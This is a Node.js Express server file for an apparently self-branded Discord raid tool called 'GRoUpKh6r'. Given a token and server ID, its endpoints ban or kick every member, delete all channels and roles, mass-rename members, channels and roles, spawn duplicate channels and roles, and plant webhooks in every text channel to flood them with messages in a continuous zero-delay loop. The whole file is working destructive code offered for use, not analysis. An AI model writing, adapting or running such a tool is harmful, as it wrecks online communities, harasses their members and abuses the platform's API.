// language: JavaScript, file: server.js, target: Node.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DISCORD_API = 'https://discord.com/api/v10';

const getHeaders = (token) => ({
    'Authorization': token.startsWith('Bot ') || token.length > 60 ? token : `Bot ${token}`,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
});

// Helper for rapid batch execution
async function batchProcess(items, fn, concurrency = 20) {
    let index = 0;
    const results = [];
    async function worker() {
        while (index < items.length) {
            const currentIndex = index++;
            try {
                results[currentIndex] = await fn(items[currentIndex]);
            } catch (e) {
                results[currentIndex] = { error: e.message };
            }
        }
    }
    const workers = Array(Math.min(concurrency, items.length)).fill(0).map(() => worker());
    await Promise.all(workers);
    return results;
}

// 1. Rename Server
app.post('/api/guild/rename', async (req, res) => {
    const { token, guildId, name } = req.body;
    try {
        await axios.patch(`${DISCORD_API}/guilds/${guildId}`, { name }, { headers: getHeaders(token) });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 2. Kick All Members
app.post('/api/guild/kick-all', async (req, res) => {
    const { token, guildId } = req.body;
    try {
        const headers = getHeaders(token);
        let members = [];
        let after = '0';
        let fetchMore = true;
        while (fetchMore) {
            const resMembers = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000&after=${after}`, { headers });
            const data = resMembers.data;
            if (data.length === 0) { fetchMore = false; } else {
                members.push(...data);
                after = data[data.length - 1].user.id;
            }
        }
        await batchProcess(members, (m) => axios.delete(`${DISCORD_API}/guilds/${guildId}/members/${m.user.id}`, { headers }), 15);
        res.json({ success: true, count: members.length });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 3. Ban All Members
app.post('/api/guild/ban-all', async (req, res) => {
    const { token, guildId } = req.body;
    try {
        const headers = getHeaders(token);
        let members = [];
        let after = '0';
        let fetchMore = true;
        while (fetchMore) {
            const resMembers = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000&after=${after}`, { headers });
            const data = resMembers.data;
            if (data.length === 0) { fetchMore = false; } else {
                members.push(...data);
                after = data[data.length - 1].user.id;
            }
        }
        await batchProcess(members, (m) => axios.put(`${DISCORD_API}/guilds/${guildId}/bans/${m.user.id}`, { delete_message_seconds: 0 }, { headers }), 15);
        res.json({ success: true, count: members.length });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 4. Change All Member Names (Nicknames)
app.post('/api/guild/rename-members', async (req, res) => {
    const { token, guildId, nickname } = req.body;
    try {
        const headers = getHeaders(token);
        let members = [];
        let after = '0';
        let fetchMore = true;
        while (fetchMore) {
            const resMembers = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000&after=${after}`, { headers });
            const data = resMembers.data;
            if (data.length === 0) { fetchMore = false; } else {
                members.push(...data);
                after = data[data.length - 1].user.id;
            }
        }
        await batchProcess(members, (m) => axios.patch(`${DISCORD_API}/guilds/${guildId}/members/${m.user.id}`, { nick: nickname }, { headers }), 15);
        res.json({ success: true, count: members.length });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 5. Delete All Rooms and Roles (Purge)
app.post('/api/guild/purge', async (req, res) => {
    const { token, guildId } = req.body;
    try {
        const headers = getHeaders(token);
        const [channelsRes, rolesRes] = await Promise.all([
            axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers }),
            axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, { headers })
        ]);

        await Promise.all([
            batchProcess(channelsRes.data, c => axios.delete(`${DISCORD_API}/channels/${c.id}`, { headers }), 20),
            batchProcess(rolesRes.data.filter(r => r.name !== '@everyone' && !r.managed), r => axios.delete(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { headers }), 20)
        ]);

        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 6. Create Rooms (Exact Names, No Number Suffixes)
app.post('/api/guild/create-channels', async (req, res) => {
    const { token, guildId, name, count } = req.body;
    try {
        const headers = getHeaders(token);
        const items = Array(count).fill(name);
        await batchProcess(items, (channelName) => axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, { name: channelName, type: 0 }, { headers }), 25);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 7. Create Roles (Rosters)
app.post('/api/guild/create-roles', async (req, res) => {
    const { token, guildId, name, count } = req.body;
    try {
        const headers = getHeaders(token);
        const items = Array(count).fill(name);
        await batchProcess(items, (roleName) => axios.post(`${DISCORD_API}/guilds/${guildId}/roles`, { name: roleName }, { headers }), 25);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 8. Rename All Existing Rooms
app.post('/api/guild/rename-channels', async (req, res) => {
    const { token, guildId, name } = req.body;
    try {
        const headers = getHeaders(token);
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
        await batchProcess(channelsRes.data, c => axios.patch(`${DISCORD_API}/channels/${c.id}`, { name }, { headers }), 25);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 9. Rename All Existing Roles (Rosters)
app.post('/api/guild/rename-roles', async (req, res) => {
    const { token, guildId, name } = req.body;
    try {
        const headers = getHeaders(token);
        const rolesRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, { headers });
        const targets = rolesRes.data.filter(r => r.name !== '@everyone' && !r.managed);
        await batchProcess(targets, r => axios.patch(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { name }, { headers }), 25);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 10. Standalone Webhack & Instant Zero-Delay Flood
app.post('/api/guild/webhook-spam-only', async (req, res) => {
    const { token, guildId, messageText } = req.body;
    try {
        const headers = getHeaders(token);
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
        const textChannels = channelsRes.data.filter(c => c.type === 0);

        const webhooks = (await batchProcess(textChannels, async (channel) => {
            try {
                const wh = await axios.post(`${DISCORD_API}/channels/${channel.id}/webhooks`, { name: 'GRoUpKh6r-Spam' }, { headers });
                return wh.data;
            } catch { return null; }
        }, 25)).filter(Boolean);

        res.json({ success: true, webhooksCreated: webhooks.length });

        global.spamActive = true;
        const blast = async () => {
            while (global.spamActive) {
                await Promise.all(webhooks.map(wh => 
                    axios.post(`https://discord.com/api/webhooks/${wh.id}/${wh.token}`, { content: messageText }, { timeout: 2000 }).catch(() => {})
                ));
            }
        };
        blast();
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// 11. Simultaneous Rename Rooms + Instant Webhack Flood
app.post('/api/guild/rename-and-webhook-spam', async (req, res) => {
    const { token, guildId, channelName, messageText } = req.body;
    try {
        const headers = getHeaders(token);
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
        const textChannels = channelsRes.data.filter(c => c.type === 0);

        await Promise.all([
            batchProcess(textChannels, c => axios.patch(`${DISCORD_API}/channels/${c.id}`, { name: channelName }, { headers }), 25),
            batchProcess(textChannels, async (c) => {
                try {
                    const wh = await axios.post(`${DISCORD_API}/channels/${c.id}/webhooks`, { name: 'GRoUpKh6r-Spam' }, { headers });
                    return wh.data;
                } catch { return null; }
            }, 25)
        ].map(p => p.catch(() => {})));

        // Re-fetch webhooks or use created ones to start zero-delay continuous flood
        const updatedChannels = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
        const freshTextChannels = updatedChannels.data.filter(c => c.type === 0);
        
        const allWebhooks = [];
        await batchProcess(freshTextChannels, async (c) => {
            try {
                const whs = await axios.get(`${DISCORD_API}/channels/${c.id}/webhooks`, { headers });
                if (whs.data && whs.data.length > 0) allWebhooks.push(whs.data[0]);
            } catch {}
        }, 25);

        res.json({ success: true, activeWebhooks: allWebhooks.length });

        global.spamActive = true;
        const continuousBlast = async () => {
            while (global.spamActive) {
                await Promise.all(allWebhooks.map(wh => 
                    axios.post(`https://discord.com/api/webhooks/${wh.id}/${wh.token}`, { content: messageText }, { timeout: 2000 }).catch(() => {})
                ));
            }
        };
        continuousBlast();
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

app.post('/api/guild/stop-spam', (req, res) => {
    global.spamActive = false;
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`[+] GRoUpKh6r engine active on port ${PORT}`);
});
